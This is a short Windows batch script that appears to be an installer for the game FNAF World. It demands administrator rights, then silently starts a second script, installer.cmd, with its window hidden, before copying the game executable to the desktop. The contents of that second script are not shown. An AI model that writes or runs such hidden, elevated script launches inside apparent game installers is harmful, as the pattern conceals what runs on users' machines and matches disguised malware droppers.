@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    start /b powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Please run this installer as an administrator!')"
    pause
    exit /b
)

powershell -WindowStyle Hidden -Command "Start-Process '%~dp0installer.cmd' -WindowStyle Hidden"
copy "%~dp0fnaf-world.exe" "%userprofile%\Desktop" >nul 2>&1
start /b powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('FNAF World has been installed to your desktop!')"
exit /b